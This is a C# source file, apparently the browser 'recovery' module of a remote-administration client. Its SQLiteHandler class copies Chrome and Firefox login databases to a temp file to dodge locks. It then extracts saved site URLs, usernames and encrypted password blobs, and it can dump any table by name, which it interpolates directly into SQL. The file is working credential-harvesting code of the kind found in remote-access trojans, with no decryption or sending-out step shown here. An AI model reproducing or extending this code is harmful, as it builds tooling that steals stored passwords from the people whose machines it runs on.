using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Runtime.InteropServices;

namespace RemoteAdmin.Client.Recovery.Browsers
{
    /// <summary>
    /// Helper class for reading SQLite databases with proper binary handling
    /// Supports both Firefox (moz_logins table) and Chrome/Chromium (logins table) formats
    /// </summary>
    public class SQLiteHandler : IDisposable
    {
        private SQLiteConnection _connection;
        private readonly string _tempDbPath;
        private table_entry[] table_entries;
        private sqlite_master_entry[] master_table_entries;
        private string[] field_names = new string[1];
        private int row_count = 0;

        public SQLiteHandler(string dbPath)
        {
            // Create a temporary copy of the database to avoid lock issues
            _tempDbPath = Path.Combine(Path.GetTempPath(), $"temp_db_{Guid.NewGuid()}.db");

            try
            {
                File.Copy(dbPath, _tempDbPath, true);
                _connection = new SQLiteConnection($"Data Source={_tempDbPath};Version=3;");
                _connection.Open();
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to open database: {ex.Message}", ex);
            }
        }

        /// <summary>
        /// Read Chrome/Chromium-style logins table with encrypted password blobs
        /// </summary>
        public List<LoginData> ReadLogins()
        {
            var logins = new List<LoginData>();

            using (var command = new SQLiteCommand(
                "SELECT origin_url, action_url, username_value, password_value FROM logins",
                _connection))
            using (var reader = command.ExecuteReader())
            {
                while (reader.Read())
                {
                    var originUrl = reader.IsDBNull(0) ? string.Empty : reader.GetString(0);
                    var actionUrl = reader.IsDBNull(1) ? string.Empty : reader.GetString(1);
                    var username = reader.IsDBNull(2) ? string.Empty : reader.GetString(2);

                    byte[] encryptedPassword = null;
                    if (!reader.IsDBNull(3))
                    {
                        long length = reader.GetBytes(3, 0, null, 0, 0);
                        encryptedPassword = new byte[length];
                        reader.GetBytes(3, 0, encryptedPassword, 0, (int)length);
                    }

                    var url = !string.IsNullOrEmpty(originUrl) ? originUrl : actionUrl;

                    if (!string.IsNullOrEmpty(url))
                    {
                        var login = new LoginData
                        {
                            Url = url,
                            Username = username,
                            EncryptedPassword = encryptedPassword
                        };

                        // Diagnostics: prefix + length (do NOT print actual decrypted data)
                        if (encryptedPassword != null && encryptedPassword.Length > 0)
                        {
                            login.BlobLength = encryptedPassword.Length;

                            // try ASCII prefix first (3 bytes)
                            if (encryptedPassword.Length >= 3)
                            {
                                try
                                {
                                    var prefix = System.Text.Encoding.ASCII.GetString(encryptedPassword, 0, 3);
                                    // if printable ascii, store it, otherwise hex
                                    bool allPrintable = true;
                                    foreach (var c in prefix)
                                        if (char.IsControl(c) || c == '\ufffd') { allPrintable = false; break; }

                                    login.BlobPrefixAscii = allPrintable ? prefix : BitConverter.ToString(encryptedPassword, 0, Math.Min(3, encryptedPassword.Length)).Replace("-", "");
                                }
                                catch
                                {
                                    login.BlobPrefixAscii = BitConverter.ToString(encryptedPassword, 0, Math.Min(3, encryptedPassword.Length)).Replace("-", "");
                                }
                            }
                            else
                            {
                                login.BlobPrefixAscii = BitConverter.ToString(encryptedPassword).Replace("-", "");
                            }
                        }
                        else
                        {
                            login.BlobLength = 0;
                            login.BlobPrefixAscii = "<empty>";
                        }

                        logins.Add(login);
                    }
                }
            }

            return logins;
        }

        /// <summary>
        /// Read Firefox-style table (generic method for any table structure)
        /// </summary>
        public bool ReadTable(string tableName)
        {
            try
            {
                // First, get column names
                using (var cmd = new SQLiteCommand($"PRAGMA table_info({tableName})", _connection))
                using (var reader = cmd.ExecuteReader())
                {
                    var columnNames = new List<string>();
                    while (reader.Read())
                    {
                        columnNames.Add(reader.GetString(1)); // Column name is at index 1
                    }
                    field_names = columnNames.ToArray();
                }

                if (field_names.Length == 0)
                    return false;

                // Now read the actual data
                using (var cmd = new SQLiteCommand($"SELECT * FROM {tableName}", _connection))
                using (var reader = cmd.ExecuteReader())
                {
                    var entries = new List<table_entry>();

                    while (reader.Read())
                    {
                        var entry = new table_entry
                        {
                            content = new string[field_names.Length]
                        };

                        for (int i = 0; i < field_names.Length; i++)
                        {
                            if (!reader.IsDBNull(i))
                            {
                                entry.content[i] = reader.GetValue(i).ToString();
                            }
                            else
                            {
                                entry.content[i] = string.Empty;
                            }
                        }

                        entries.Add(entry);
                    }

                    table_entries = entries.ToArray();
                    row_count = table_entries.Length;
                }

                return true;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Gets the number of rows in the currently loaded table
        /// </summary>
        public int GetRowCount()
        {
            return row_count;
        }

        /// <summary>
        /// Gets a value by row number and field index
        /// </summary>
        public string GetValue(int row_num, int field)
        {
            if (row_num >= this.table_entries.Length)
            {
                return null;
            }
            if (field >= this.table_entries[row_num].content.Length)
            {
                return null;
            }
            return this.table_entries[row_num].content[field];
        }

        /// <summary>
        /// Gets a value by row number and field name
        /// </summary>
        public string GetValue(int row_num, string field)
        {
            int num = -1;
            for (int i = 0; i < this.field_names.Length; i++)
            {
                if (this.field_names[i].Equals(field, StringComparison.OrdinalIgnoreCase))
                {
                    num = i;
                    break;
                }
            }
            if (num == -1)
            {
                return null;
            }
            return this.GetValue(row_num, num);
        }

        public void Dispose()
        {
            try
            {
                _connection?.Close();
                _connection?.Dispose();

                if (File.Exists(_tempDbPath))
                {
                    File.Delete(_tempDbPath);
                }
            }
            catch
            {
                // Ignore cleanup errors
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct table_entry
        {
            public long row_id;
            public string[] content;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct sqlite_master_entry
        {
            public long row_id;
            public string item_type;
            public string item_name;
            public string astable_name;
            public long root_num;
            public string sql_statement;
        }
    }

    /// <summary>
    /// Represents login data from Chrome/Chromium databases
    /// </summary>
    public class LoginData
    {
        public string Url { get; set; }
        public string Username { get; set; }
        public string accounts { get; set; }
        public byte[] EncryptedPassword { get; set; }
        public string BlobPrefixAscii { get; set; }    // e.g. "v10" or hex if non-ascii
        public int BlobLength { get; set; }
    }
}